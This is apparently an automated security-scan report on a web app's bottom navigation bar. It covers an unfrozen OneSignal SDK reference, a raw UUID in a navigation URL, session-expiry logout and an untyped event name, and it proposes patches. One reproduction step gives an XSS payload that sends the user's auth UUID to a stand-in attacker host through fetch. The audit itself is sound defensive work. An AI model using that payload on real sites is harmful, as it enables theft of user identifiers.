---
name: vcsm.bottom-nav.elektra-security-scan.2026-06-06
description: ELEKTRA v1 precision security scan of the VCSM bottom navigation bar shell — targeted run 2026-06-06
metadata:
  type: security-scan
  owner: ELEKTRA
  run-date: 2026-06-06
  scope: VCSM
  target: shared/components/BottomNavBar — shell layer
  preflight-architect: PASS (2026-06-06, fresh)
  preflight-venom: PASS (2026-06-06, fresh)
  preflight-blackwidow: PASS (2026-06-06, fresh)
  elektra-version: v1
  mode: standalone (no evidence-bundle.json — targeted source reads)
---

# ELEKTRA Security Report

**Date:** 2026-06-06
**Scope:** VCSM
**Reviewer:** ELEKTRA v1
**Scan Trigger:** MANUAL — governance chain (ARCHITECT → VENOM → BLACKWIDOW → ELEKTRA)
**Findings Summary:** 0 HIGH | 1 MEDIUM | 2 LOW | 1 INFO
**False Positives Rejected:** 5
**Suggested Patches:** 4

---

## PREFLIGHT GATE RESULTS

```
ELEKTRA ARCHITECT GATE PASS

Upstream Report:
- ARCHITECT: ZZnotforproduction/APPS/VCSM/features/shared/modules/bottomBarNav/vcsm.bottom-nav.architecture.md
  Scope: VCSM / shared / bottom-nav
  Date: 2026-06-06
  Status: SUCCESS
  Age: 0 days

Proceeding with ELEKTRA scan.
```

```
ELEKTRA PREFLIGHT PASS

Upstream Reports:
- VENOM: ZZnotforproduction/APPS/VCSM/features/shared/modules/bottomBarNav/2026-06-06_venom_bottom-nav-security-review.md
- BLACKWIDOW: ZZnotforproduction/APPS/VCSM/features/shared/modules/bottomBarNav/2026-06-06_blackwidow_bottom-nav-adversarial-review.md

Proceeding with ELEKTRA verification.
```

---

## SCAN TARGET DECLARATION

```
ELEKTRA SCAN TARGET
Feature / Route / Engine: shared/components/BottomNavBar (persistent shell layer)
Application Scope:        VCSM
Reason for scan:          Security governance chain — VENOM + BLACKWIDOW referral
Scan trigger:             MANUAL (governance chain)
Upstream VENOM report:    bottomBarNav/2026-06-06_venom_bottom-nav-security-review.md
Upstream BLACKWIDOW report: bottomBarNav/2026-06-06_blackwidow_bottom-nav-adversarial-review.md
```

---

## Scanner Inputs

**Mode:** Standalone (no `evidence-bundle.json` present for this targeted module scan)

| Map | Generated At | Age | Freshness | Confidence | Notes |
|---|---|---|---|---|---|
| ARCHITECT module report | 2026-06-06 | 0 days | FRESH | HIGH | Layer map, boundary violations, security surfaces |
| VENOM report | 2026-06-06 | 0 days | FRESH | HIGH | 7 findings; trust-boundary violations identified |
| BLACKWIDOW report | 2026-06-06 | 0 days | FRESH | HIGH | 3 new findings; 11 attacks; 2 BYPASSED, 1 PARTIAL |
| Direct source reads | 2026-06-06 | 0 days | FRESH | HIGH | 5 files precision-read for chain verification |

**Full Rediscovery Performed:** NO — ARCHITECT module report and VENOM/BLACKWIDOW reports consumed as primary chain candidate sources. Source reads were targeted confirmation only.

**Scanner Version:** 1.1.0 (standalone mode — no evidence-bundle)
**Identity-tier write sinks:** 0 — shared layer confirmed no DAL by ARCHITECT
**Resource-tier write sinks:** 0
**External SDK surfaces:** 1 (OneSignal)
**Chain candidates pre-computed:** 4 (from VENOM + BLACKWIDOW referral list)

---

## ENTRY POINT MAP

```
ENTRY POINT MAP

Route / API / Controller: BottomNavBar.jsx — always-mounted persistent shell
Input sources (user-controlled):
  - identity.actorId  — auth-controlled Zustand store (Supabase session-derived)
  - user.id           — auth-controlled Supabase session
  - location.pathname — React Router (read-only, client-side navigation)
  - window.OneSignal  — global window object (writable under XSS)

Trusted input boundary:
  - Identity: Supabase session → AuthProvider → useAuth() / useIdentity() — TRUSTED
  - OneSignal SDK: window.OneSignal — UNTRUSTED under XSS (writable global)
  - Route params: /:actorId — partially trusted (self-navigation; VportLeadsChip uses actorId from session)

Validation present at boundary:
  - actorId → UUID_RX regex in bootstrap.hydrate.controller.js:13 — YES
  - window.OneSignal reference — NO (not validated; writable global)
  - leadsPath URL construction — NO slug resolution applied
```

---

## VULNERABILITY SURFACE INVENTORY

```
ELEKTRA VULNERABILITY SURFACE INVENTORY
=========================================
Feature: shared / bottom navigation bar shell
Scan Date: 2026-06-06

Write Sinks: 0 (confirmed ZERO — shared layer has no DAL)
  Identity-tier: 0
  Resource-tier: 0
  Content-tier: 0

RPC Sinks: 0

Edge Function Sinks: 0

External SDK Sinks: 1 — OneSignal SDK (loginOneSignalExternalUser, logoutOneSignalExternalUser)
  SDK reference integrity: WEAK (window.OneSignal is mutable global)

URL Construction Sinks: 1 — VportLeadsChip.jsx:23 navigate(leadsPath)
  UUID exposure in path: CONFIRMED

Chain Candidates (from VENOM + BLACKWIDOW referral): 4
  window.OneSignal XSS amplification: 1 — PRIORITY
  VportLeadsChip UUID in URL: 1
  OneSignal session expiry gap: 1
  noti:refresh untyped event: 1
```

---

## Scanner Signals

| Chain Candidate | Source | Callgraph Path | Scanner Confidence | Source Verified | Chain Verdict | Provenance | Finding |
|---|---|---|---|---|---|---|---|
| window.OneSignal → sdk.login(user.id) | VENOM V-BN-003 + BW-BN-001 | onesignalClient.js:14 → os() → sdk.login() | HIGH | YES — onesignalClient.js:15 (os reads window.OneSignal), :58 (sdk.login call) | VALID_FINDING — reference not frozen | [SOURCE_VERIFIED] | ELEK-2026-06-06-001 |
| actorId → navigate('/actor/{uuid}/dashboard/leads') | BW-BN-002 | VportLeadsChip.jsx:12 → :15 → :23 | HIGH | YES — VportLeadsChip.jsx:15 (path construction), :23 (navigate call) | VALID_FINDING — UUID in URL | [SOURCE_VERIFIED] | ELEK-2026-06-06-002 |
| !user → logoutOneSignalExternalUser() | VENOM V-BN-006 | useOneSignalPush.js:71-75 | MEDIUM | YES (partial) — guard at :72 present; AuthProvider propagation unverified | INCOMPLETE — partial chain | [SCANNER_LEAD] | ELEK-2026-06-06-003 |
| noti:refresh string literal | VENOM V-BN-007 | BottomNavBar.jsx:45 + bootstrap.hydrate.controller.js:49 | HIGH | YES — both files read, bare string confirmed at both sites | VALID_FINDING — untyped event | [SOURCE_VERIFIED] | ELEK-2026-06-06-004 |
| Identity adapter bypass (3 sites) | VENOM V-BN-005 | RootLayout.jsx:10, VportLeadsChip.jsx:3, useVportNewLeadsCount.js:2 | HIGH | YES — BW confirmed no security delta | VALID_CHAIN_SAFE (security); governance violation only | [SOURCE_VERIFIED] | FP-001 |
| Profiles controller direct import | VENOM V-BN-004 | BottomNavBar.jsx:9 → getCachedActorCanonicalSlug | HIGH | YES — read-only cache access; no mutation sink | VALID_CHAIN_SAFE (security) | [SOURCE_VERIFIED] | FP-002 |
| MISSING_BEHAVIOR_CONTRACT | VENOM V-BN-001 | N/A — governance gap | HIGH | N/A — not a code chain | NO_EXPLOIT_CHAIN — governance gap | N/A | FP-003 |
| noti:refresh flooding under XSS | BW-BN-003 | BottomNavBar.jsx:45 → queryClient.invalidateQueries | MEDIUM | YES — React Query batching confirmed | VALID_CHAIN_SAFE (React Query dedup) | [SOURCE_VERIFIED] | FP-004 |
| Area 1 — IDOR/write surface | N/A | N/A | N/A | YES (absence) — 0 write surfaces in shared layer | NO_SINK — write surfaces absent | N/A | FP-005 |

---

## Source-to-Sink Analysis

### CHAIN-BOTTOMNAV-001 — window.OneSignal Reference Not Frozen

```
DATA FLOW TRACE

Source:      window.OneSignal — global object, writable by any script (onesignalClient.js:15)
Validation at boundary: NONE — os() reads window.OneSignal fresh on every call; no integrity check
Intermediate transforms: os() returns window.OneSignal directly; sdk = os() in loginOneSignalExternalUser
Sink:        sdk.login(String(externalId)) — onesignalClient.js:58
Defense at sink: ABSENT — no reference integrity check before calling login()
```

Under XSS, an attacker can replace `window.OneSignal` with a hostile object after the SDK initializes. Every subsequent call to `os()` returns the hostile object. When `loginOneSignalExternalUser(user.id)` is triggered (e.g., on identity hydration), the hostile `.login()` receives `user.id` — a stable, permanent Supabase auth UUID.

**Chain validation:** VALID — all five links confirmed in source.

---

### CHAIN-BOTTOMNAV-002 — Raw actorId UUID in VportLeadsChip Navigation URL

```
DATA FLOW TRACE

Source:      identity?.actorId (Supabase UUID) — VportLeadsChip.jsx:12, session-derived
Validation at boundary: NONE — actorId used directly in template literal at :15
Intermediate transforms: template literal `\`/actor/${actorId}/dashboard/leads\`` — no slug resolution
Sink:        navigate(leadsPath) — VportLeadsChip.jsx:23 — UUID visible in browser URL bar
Defense at sink: ABSENT — no isQrSafeSlug() guard; no getCachedActorCanonicalSlug() call
```

No XSS required. Raw UUID appears in the browser URL bar when a VPORT actor clicks the leads chip. User can copy or share the URL, exposing their permanent Supabase actorId.

**Chain validation:** VALID — all five links confirmed in source.

---

### CHAIN-BOTTOMNAV-003 — OneSignal External-User Binding on Session Expiry

```
DATA FLOW TRACE

Source:      Supabase auth session expiry (server-side)
Validation at boundary: useOneSignalPush.js:72 — `if (!user) logoutOneSignalExternalUser()`
Intermediate transforms: user state from useAuth() → AuthProvider → onAuthStateChange event
Sink:        window.OneSignal SDK maintains user.id binding (persistent)
Defense at sink: PARTIAL — explicit sign-out sets user=null → logout triggered
                 UNVERIFIED — server-side session expiry → AuthProvider → user=null path not source-verified
```

The `!user` guard at `useOneSignalPush.js:72` handles explicit sign-out. Whether Supabase `SIGNED_OUT` auth state change (triggered by token expiry) propagates to `user=null` in `AuthProvider` is unverified — requires reading `AuthProvider.jsx` to confirm. If it does propagate, the gap is closed. If not, the OneSignal binding persists until explicit user sign-out.

**Chain validation:** INCOMPLETE — chain partially traced to source; AuthProvider propagation unverified.

---

### CHAIN-BOTTOMNAV-004 — noti:refresh Untyped Bare String

```
DATA FLOW TRACE

Source:      Developer authoring (typo risk)
Validation at boundary: N/A
Intermediate transforms: string literal compared at addEventListener / dispatchEvent boundary
Sink:        Mismatched string → silent failure; future misuse → arbitrary invalidation
Defense at sink: ABSENT — no typed contract; no named constant
```

Not an exploit. Bare string `'noti:refresh'` appears at two separate call sites. A typo or copy-paste error causes silent failures; no exploit chain exists. This is a code hygiene/defense-in-depth finding.

**Chain validation:** VALID (INFO level — no exploit path, defense-in-depth recommendation).

---

## Verified Vulnerabilities

---

### SECURITY FINDING

- **Finding ID:** ELEK-2026-06-06-001
- **Title:** window.OneSignal Global Reference Not Frozen — XSS Auth UUID Exfiltration Path
- **Category:** Auth Bypass / Secrets Exposure (external SDK integrity)
- **Severity:** MEDIUM
- **Status:** Open
- **Scope:** VCSM
- **Location:** `apps/VCSM/src/services/onesignal/onesignalClient.js:14-16, 53-62`
- **Source:** `window.OneSignal` — global, writable by any JavaScript executing in the page context
- **Sink:** `sdk.login(String(externalId))` — `onesignalClient.js:58`
- **Trust Boundary:** `os()` function at line 14 — should validate or freeze the SDK reference
- **Impact:** Under XSS, attacker replaces `window.OneSignal` with hostile object; `loginOneSignalExternalUser(user.id)` passes Supabase auth UUID (`user.id`) to attacker-controlled `login()` function; UUID exfiltrated to attacker server
- **Evidence:**
  ```js
  // onesignalClient.js:14-16
  function os() {
    return typeof window !== 'undefined' ? (window.OneSignal ?? null) : null
  }
  // onesignalClient.js:55-58
  const sdk = os()
  if (!sdk) return
  try {
    await sdk.login(String(externalId))
  ```
- **Reproduction Steps:**
  1. Achieve XSS in VCSM (required precondition)
  2. Execute: `window.OneSignal = { login: (id) => fetch('https://attacker.invalid/?id='+id), logout: () => {} }`
  3. Wait for `loginOneSignalExternalUser(user.id)` to be called (on next identity hydration or page re-focus)
  4. `os()` returns the replaced object; `sdk.login(user.id)` transmits auth UUID to attacker endpoint
- **Existing Defense:** `_initQueued` flag in `initOneSignal.js` prevents double SDK initialization — unrelated to `os()` reference reads
- **Why Defense Is Insufficient:** `os()` reads `window.OneSignal` fresh on every call; module-level cache not used; `_initQueued` is in a separate file and guards initialization, not reference access
- **Recommended Fix:** Freeze the SDK reference in `onesignalClient.js` at first successful acquisition; subsequent calls return the frozen reference without re-reading `window.OneSignal`
- **Suggested Patch:**
  ```js
  // apps/VCSM/src/services/onesignal/onesignalClient.js:13-16
  
  // Before:
  function os() {
    return typeof window !== 'undefined' ? (window.OneSignal ?? null) : null
  }
  
  // After (suggested — human must review before applying):
  let _frozenSdk = null
  function os() {
    if (_frozenSdk) return _frozenSdk
    if (typeof window === 'undefined') return null
    const sdk = window.OneSignal ?? null
    if (sdk) _frozenSdk = sdk        // freeze on first successful acquisition
    return sdk
  }
  ```
  Explanation: `_frozenSdk` is captured once at module scope when the real SDK is first available. After freeze, XSS replacement of `window.OneSignal` has no effect — `os()` returns the previously frozen reference. The freeze window (before first `os()` call with a real SDK loaded) is narrow: the SDK script must load and set `window.OneSignal` before any auth-triggered login call. In practice this means XSS injected before the SDK loads could still poison the reference — but this window is substantially narrower than the current unlimited exposure window.
  
  For complete mitigation: pair this with moving the freeze into the deferred init callback in `initOneSignal.js`, where the SDK object is provided as a clean local parameter to the deferred function.
- **Provenance:** [SOURCE_VERIFIED]
- **Follow-up Command:** BLACKWIDOW (re-verify after patch; confirm freeze eliminates exfiltration chain)

---

### SECURITY FINDING

- **Finding ID:** ELEK-2026-06-06-002
- **Title:** VportLeadsChip Embeds Raw actorId UUID in Navigation URL
- **Category:** URL Safety / Raw ID Exposure
- **Severity:** LOW
- **Status:** Open
- **Scope:** VCSM
- **Location:** `apps/VCSM/src/features/dashboard/vport/components/VportLeadsChip.jsx:12-15, 23`
- **Source:** `identity?.actorId` — UUID from Supabase auth session (`VportLeadsChip.jsx:12`)
- **Sink:** `navigate(leadsPath)` where `leadsPath = \`/actor/${actorId}/dashboard/leads\`` — `VportLeadsChip.jsx:23`
- **Trust Boundary:** URL construction at line 15 — should resolve canonical slug before constructing path
- **Impact:** Raw Supabase UUID (`actorId`) appears in browser URL bar when a VPORT actor clicks the leads chip. Actor can inadvertently expose their permanent internal identifier by sharing or copying the URL. Violates platform no-raw-IDs-in-public-URLs contract (navigation is explicitly covered by the contract).
- **Evidence:**
  ```js
  // VportLeadsChip.jsx:12-15
  const actorId = isVport ? identity?.actorId : null;
  // ...
  const leadsPath = actorId ? `/actor/${actorId}/dashboard/leads` : null;
  // VportLeadsChip.jsx:23
  onClick={() => navigate(leadsPath)}
  ```
- **Reproduction Steps:**
  1. Authenticate as a VPORT actor with pending leads
  2. Navigate to any non-leads page — VportLeadsChip renders
  3. Click the chip — browser navigates to `/actor/550e8400-e29b-41d4-a716-446655440000/dashboard/leads`
  4. UUID visible in browser URL bar
- **Existing Defense:** `isVport && actorId` guard prevents null navigation — irrelevant to UUID exposure
- **Why Defense Is Insufficient:** Path construction uses raw UUID template literal; no slug resolution; no `isQrSafeSlug()` guard
- **Recommended Fix:** Resolve the actor's canonical slug before constructing the leads path; use slug-based URL `/vport/{canonical-slug}/dashboard/leads` (requires confirming this route exists in the router)
- **Suggested Patch:**
  ```js
  // apps/VCSM/src/features/dashboard/vport/components/VportLeadsChip.jsx
  
  // Before (lines 1-4):
  import { useIdentity } from "@/state/identity/identityContext";
  import { useVportNewLeadsCount } from "@/features/dashboard/vport/dashboard/cards/leads/hooks/useVportNewLeadsCount";
  
  // After (add profiles adapter import):
  import { useIdentity } from "@/state/identity/identityContext";
  import { useActorCanonicalSlug } from "@/features/profiles/adapters/profiles.adapter";
  import { useVportNewLeadsCount } from "@/features/dashboard/vport/dashboard/cards/leads/hooks/useVportNewLeadsCount";
  
  // Before (line 15):
  const leadsPath = actorId ? `/actor/${actorId}/dashboard/leads` : null;
  
  // After:
  const { canonicalSlug } = useActorCanonicalSlug(actorId);
  const leadsPath = canonicalSlug ? `/vport/${canonicalSlug}/dashboard/leads` : null;
  ```
  Explanation: Uses the profiles adapter's `useActorCanonicalSlug` hook to resolve the human-readable slug. The leads path becomes `/vport/{canonical-slug}/dashboard/leads`, eliminating UUID exposure. Prerequisites: (1) verify the `/vport/:slug/dashboard/leads` route exists or add it; (2) `useActorCanonicalSlug` must be exported from `profiles.adapter.js` (it is — confirmed in source); (3) the `canonicalSlug` may be null until resolved — the null guard ensures the chip doesn't render until the slug is ready.
  
  This patch also fixes the VportLeadsChip identity adapter bypass (V-BN-005 component), changing from `@/state/identity/identityContext` to adapter boundary — though this is a separate concern.
- **Provenance:** [SOURCE_VERIFIED]
- **Follow-up Command:** DEADPOOL (verify `/vport/{slug}/dashboard/leads` route exists before applying patch)

---

### SECURITY FINDING

- **Finding ID:** ELEK-2026-06-06-003
- **Title:** OneSignal External-User Binding — Session Expiry Logout Path Not Source-Verified
- **Category:** Auth and Session
- **Severity:** LOW
- **Status:** Open (pending AuthProvider verification)
- **Scope:** VCSM
- **Location:** `apps/VCSM/src/shared/hooks/useOneSignalPush.js:71-75`
- **Source:** Supabase server-side session token expiry event
- **Sink:** OneSignal `window.OneSignal.logout()` — not called unless `user` goes falsy
- **Trust Boundary:** `useEffect(() => { if (!user) logoutOneSignalExternalUser() }, [user])` — depends on `user` going null on session expiry
- **Impact:** If `AuthProvider` does not propagate Supabase `SIGNED_OUT` event (triggered by token expiry) to the `user` state, the OneSignal external-user binding persists. This means push notifications can still be delivered to the device even after the session has expired server-side. Low practical impact (push delivery only), but violates session lifecycle contract.
- **Evidence:**
  ```js
  // useOneSignalPush.js:71-75
  useEffect(() => {
    if (!user) {
      logoutOneSignalExternalUser()
    }
  }, [user])
  ```
  The guard watches `user`. On explicit logout, user becomes null → logout called. On session expiry: depends on whether AuthProvider reacts to `SIGNED_OUT` events from Supabase `onAuthStateChange`.
- **Reproduction Steps:**
  1. Authenticate — OneSignal binding active
  2. Allow JWT to expire without explicit logout (e.g., close browser and wait for Supabase refresh token to expire)
  3. Re-open app without logging in — verify whether OneSignal binding was cleared
  (Note: requires reading AuthProvider.jsx to confirm or deny this path — not read in this scan)
- **Existing Defense:** `if (!user) logoutOneSignalExternalUser()` — covers explicit logout via sign-out action
- **Why Defense Is Insufficient:** Coverage of server-side expiry event unverified; depends on AuthProvider propagation chain not read in this scan
- **Recommended Fix:** Confirm `AuthProvider.jsx` calls `supabase.auth.onAuthStateChange` and sets `user=null` on `SIGNED_OUT` event — if yes, the gap is already closed; if no, add explicit SIGNED_OUT handler. Alternatively, add a direct Supabase auth state listener in `useOneSignalPush` as belt-and-suspenders.
- **Suggested Patch:**
  ```js
  // apps/VCSM/src/shared/hooks/useOneSignalPush.js
  // (only if AuthProvider does NOT propagate SIGNED_OUT — verify first)
  
  // Add belt-and-suspenders Supabase auth listener:
  import { supabase } from '@/services/supabase/supabaseClient'
  
  useEffect(() => {
    const { data: { subscription } } = supabase.auth.onAuthStateChange((event) => {
      if (event === 'SIGNED_OUT') logoutOneSignalExternalUser()
    })
    return () => subscription.unsubscribe()
  }, [])
  ```
  Explanation: Belt-and-suspenders auth event listener. If AuthProvider already propagates SIGNED_OUT, this is redundant but harmless. If it does not, this closes the gap. `logoutOneSignalExternalUser()` is idempotent (safe to call multiple times).
  
  **Action before applying:** Read `AuthProvider.jsx` to confirm whether `onAuthStateChange(SIGNED_OUT)` already sets `user=null`. If yes, this patch is optional hygiene. If no, it is required.
- **Provenance:** [SCANNER_LEAD] — full chain not source-verified; AuthProvider read required
- **Follow-up Command:** DEADPOOL (trace AuthProvider session expiry propagation path)

---

### SECURITY FINDING

- **Finding ID:** ELEK-2026-06-06-004
- **Title:** noti:refresh DOM Event Dispatched as Untyped Bare String
- **Category:** Info / Code Hygiene
- **Severity:** INFO
- **Status:** Open
- **Scope:** VCSM
- **Location:**
  - `apps/VCSM/src/shared/components/BottomNavBar.jsx:45`
  - `apps/VCSM/src/bootstrap/bootstrap.hydrate.controller.js:49`
- **Source:** Developer authoring (duplication risk)
- **Sink:** `window.addEventListener('noti:refresh', ...)` — bootstrap.hydrate.controller.js:49
- **Trust Boundary:** N/A — no exploit chain
- **Impact:** No direct exploit. Two files share a bare string literal `'noti:refresh'` with no shared constant. A typo in either file causes a silent failure (event dispatched but never received, or listener registered for a name that's never dispatched). Under XSS, an attacker can dispatch arbitrary events — but the handler only calls `queryClient.invalidateQueries` (self-DoS, no data leak).
- **Evidence:**
  ```js
  // BottomNavBar.jsx:45
  window.dispatchEvent(new Event('noti:refresh'))
  
  // bootstrap.hydrate.controller.js:49
  window.addEventListener('noti:refresh', onGlobalRefresh)
  ```
- **Existing Defense:** None — both sites use bare string literals
- **Why Defense Is Insufficient:** No shared constant, no type enforcement — future developers can silently introduce event name divergence
- **Recommended Fix:** Extract to a named constant in the bootstrap module and import it at all call sites
- **Suggested Patch:**
  ```js
  // apps/VCSM/src/bootstrap/bootstrap.hydrate.controller.js
  // Add (near top of file, after imports):
  export const NOTI_REFRESH_EVENT = 'noti:refresh'
  
  // Change line 49:
  window.addEventListener(NOTI_REFRESH_EVENT, onGlobalRefresh)
  // Change line 50:
  return () => window.removeEventListener(NOTI_REFRESH_EVENT, onGlobalRefresh)
  
  // apps/VCSM/src/shared/components/BottomNavBar.jsx
  // Add import:
  import { NOTI_REFRESH_EVENT } from '@/bootstrap/bootstrap.hydrate.controller'
  
  // Change line 45:
  window.dispatchEvent(new Event(NOTI_REFRESH_EVENT))
  ```
  Explanation: Single source of truth for the event name. Typos become compile-time import errors. All future listeners reference the same constant. Simple, zero-behavior-change refactor.
- **Provenance:** [SOURCE_VERIFIED]
- **Follow-up Command:** None (INFO level — optional hygiene improvement)

---

## False Positives Rejected

```
FALSE POSITIVE REJECTED

- Candidate:       Identity adapter bypass — 3 sites (RootLayout, VportLeadsChip, useVportNewLeadsCount)
- Location:        RootLayout.jsx:10, VportLeadsChip.jsx:3, useVportNewLeadsCount.js:2
- Rejection reason: Chain impact is zero — all 3 sites import useIdentity() which the identity
                    adapter also re-exports from the same Zustand store. No additional data is
                    accessible via the direct import path. BLACKWIDOW confirmed no security delta.
- Chain gap:        Impact — no attacker benefit from the bypass path
- Notes:           Governance violation (tracked by VENOM V-BN-005); architectural concern, not a
                   code-level vulnerability. Fix: update import paths.
```

```
FALSE POSITIVE REJECTED

- Candidate:       Profiles controller direct import — BottomNavBar reads getCachedActorCanonicalSlug
- Location:        BottomNavBar.jsx:9
- Rejection reason: The import targets a read-only in-memory TTL cache function; there is no
                    mutation sink reachable through this import. No write surface exists.
- Chain gap:        Sink — no dangerous mutation function reached
- Notes:           Governance violation (tracked by VENOM V-BN-004); adapter boundary should be
                   used. See FP-001 note about the profiles adapter surface gap. Fix requires
                   exporting getCachedActorCanonicalSlug through profiles.adapter.js.
```

```
FALSE POSITIVE REJECTED

- Candidate:       MISSING_BEHAVIOR_CONTRACT (V-BN-001)
- Location:        ZZnotforproduction/APPS/VCSM/features/shared/BEHAVIOR.md
- Rejection reason: Governance gap — a missing documentation contract has no exploitable code chain.
                    ELEKTRA requires Source → Trust Boundary → Sink → Impact → Missing Defense.
                    A missing documentation file provides no sink or attack surface.
- Chain gap:        Sink — no vulnerable function or operation; this is a documentation gap
- Notes:           HIGH VENOM finding, valid for governance purposes; route to LOGAN for
                   BEHAVIOR.md authoring. Not an ELEKTRA finding.
```

```
FALSE POSITIVE REJECTED

- Candidate:       noti:refresh event flooding under XSS (BW-BN-003)
- Location:        BottomNavBar.jsx:45, bootstrap.hydrate.controller.js:49
- Rejection reason: No data leak, no cross-actor impact, no authentication bypass. React Query
                    built-in batching and deduplication prevents 1:1 amplification of dispatches
                    to network requests. Effect is elevated refetch rate within the authenticated
                    session — self-DoS only.
- Chain gap:        Impact — attacker gains no data access or privilege; effect is self-session disruption
- Notes:           XSS is required precondition. Confirmed by BLACKWIDOW as PARTIAL. ELEKTRA-INFO-004
                   (noti:refresh constant extraction) addresses the code hygiene surface without
                   claiming this as an independent vulnerability.
```

```
FALSE POSITIVE REJECTED

- Candidate:       Area 1 (IDOR/Actor Ownership) — all scan targets
- Location:        apps/VCSM/src/shared/
- Rejection reason: The shared layer has ZERO write surfaces. ARCHITECT confirmed 0 DAL files,
                    0 controller files, 0 Supabase mutations in this layer. Area 1 has no sinks
                    to trace to.
- Chain gap:        Sink — no write sink exists in scope
- Notes:           Area 1 is N/A for this targeted scan. Any IDOR concerns in VportLeadsChip's
                   target route (/actor/:actorId/dashboard/leads) are in the leads feature, not
                   the shared shell layer.
```

---

## Suggested Patch Queue

| # | Finding ID | Title | Severity | Layer to Patch | Patch Complexity | Requires DB Change |
|---|---|---|---|---|---|---|
| 1 | ELEK-2026-06-06-001 | Freeze window.OneSignal reference in os() | MEDIUM | Service | SIMPLE | NO |
| 2 | ELEK-2026-06-06-002 | Replace UUID in VportLeadsChip navigation URL with canonical slug | LOW | UI | MODERATE | NO |
| 3 | ELEK-2026-06-06-003 | Verify AuthProvider SIGNED_OUT propagation; add belt-and-suspenders handler if absent | LOW | Hook | SIMPLE | NO |
| 4 | ELEK-2026-06-06-004 | Extract noti:refresh to named constant NOTI_REFRESH_EVENT | INFO | Hook | SIMPLE | NO |

---

## Executive Summary

ELEKTRA confirms 1 MEDIUM, 2 LOW, and 1 INFO finding in the bottom navigation bar shell layer. No HIGH findings. No write surfaces exist in this layer — IDOR and RLS areas are N/A.

The primary confirmed risk is the **window.OneSignal reference not being frozen** (ELEK-2026-06-06-001). This creates an XSS amplification path: a successful XSS attack can intercept the Supabase auth UUID via a fake SDK login() call. The fix is a 7-line, zero-behavior-change patch in `onesignalClient.js`. This should be prioritized before the next THOR gate.

The **UUID in VportLeadsChip navigation URL** (ELEK-2026-06-06-002) violates the platform no-raw-IDs contract. The patch requires using `useActorCanonicalSlug` from the profiles adapter and confirming the slug-based leads route exists in the router.

The **OneSignal session expiry gap** (ELEK-2026-06-06-003) requires reading `AuthProvider.jsx` to determine if it is already closed. DEADPOOL should verify the AuthProvider propagation path before applying the suggested patch.

The **noti:refresh untyped string** (ELEK-2026-06-06-004) is INFO-level hygiene with a trivial fix.

5 upstream VENOM/BLACKWIDOW findings were rejected as false positives from ELEKTRA's chain-verification perspective (governance violations with no exploit chains, and a self-DoS-only finding). These remain valid for governance tracking under VENOM/BLACKWIDOW ownership.

---

## Required Follow-up Commands

| Command | Reason | Status |
|---|---|---|
| BLACKWIDOW | Re-verify ELEK-2026-06-06-001 after OneSignal reference freeze patch is applied | PENDING |
| DEADPOOL | Trace AuthProvider.jsx session expiry propagation to confirm/close ELEK-2026-06-06-003 | PENDING |
| DEADPOOL | Verify `/vport/{slug}/dashboard/leads` route exists before applying ELEK-2026-06-06-002 patch | PENDING |
| VENOM | Re-verify V-BN-004 and V-BN-005 after adapter boundary fixes are applied | PENDING |
| LOGAN | Author BEHAVIOR.md §5 Security Rules and §9 Must Never Happen for shared module | PENDING |
| THOR | Gate evaluation — no ELEKTRA HIGH blockers; VENOM V-BN-001 HIGH still open | PENDING (separate session) |

---

## Source Verification Summary

Chain candidates evaluated: 9
Chains source-verified: 8 / 9 (ELEK-2026-06-06-003 is [SCANNER_LEAD] — AuthProvider not read)
Source files read: 5

Valid findings: 4
Rejected (false positive): 5
Incomplete (scanner leads): 1 (ELEK-2026-06-06-003)

### 9.1 SOURCE READ SUMMARY

| Command | Source Files Read | Evidence Bundle Used | Full Rediscovery Performed |
|---|---:|---|---|
| ELEKTRA | 5 | NO (standalone mode — no evidence-bundle.json generated for this targeted scan) | NO |

Files read (precision confirmation and patch-line verification only):
- `apps/VCSM/src/services/onesignal/onesignalClient.js:1-87` — reason: ELEK-2026-06-06-001 chain verification + patch line
- `apps/VCSM/src/shared/hooks/useOneSignalPush.js:1-93` — reason: ELEK-2026-06-06-003 session expiry guard verification
- `apps/VCSM/src/bootstrap/bootstrap.hydrate.controller.js:1-52` — reason: ELEK-2026-06-06-004 noti:refresh event confirmation
- `apps/VCSM/src/features/dashboard/vport/components/VportLeadsChip.jsx:1-89` — reason: ELEK-2026-06-06-002 URL chain confirmation
- `apps/VCSM/src/services/onesignal/initOneSignal.js:1-48` — reason: Area 5 secrets audit + OneSignal init pattern verification

---

## Confidence Summary

HIGH confidence chains: 8
LOW confidence chains: 0
[SOURCE_VERIFIED] findings: 3 (ELEK-001, ELEK-002, ELEK-004)
[SCANNER_LEAD] findings: 1 (ELEK-003)

---

## THOR Impact

**THOR Release Blockers from ELEKTRA:** NONE
- No HIGH findings emitted
- MEDIUM finding ELEK-2026-06-06-001: THOR may treat as CAUTION (patch is SIMPLE, no DB changes required)

**VENOM HIGH finding still open:** V-BN-001 (MISSING_BEHAVIOR_CONTRACT) — THOR must assess this independently; ELEKTRA deferred as governance gap

**BLACKWIDOW CAUTION recommendation:** Consistent with ELEKTRA assessment.

**Required BLACKWIDOW confirmation for CRITICAL escalation:** N/A — no finding at CRITICAL threshold.

---

## Scanner Inputs (final)

| Input | Path | Date | Age | Freshness |
|---|---|---|---|---|
| ARCHITECT module report | bottomBarNav/vcsm.bottom-nav.architecture.md | 2026-06-06 | 0d | FRESH |
| VENOM report | bottomBarNav/2026-06-06_venom_bottom-nav-security-review.md | 2026-06-06 | 0d | FRESH |
| BLACKWIDOW report | bottomBarNav/2026-06-06_blackwidow_bottom-nav-adversarial-review.md | 2026-06-06 | 0d | FRESH |
| onesignalClient.js | Direct source read | 2026-06-06 | 0d | FRESH |
| useOneSignalPush.js | Direct source read | 2026-06-06 | 0d | FRESH |
| bootstrap.hydrate.controller.js | Direct source read | 2026-06-06 | 0d | FRESH |
| VportLeadsChip.jsx | Direct source read | 2026-06-06 | 0d | FRESH |
| initOneSignal.js | Direct source read | 2026-06-06 | 0d | FRESH |
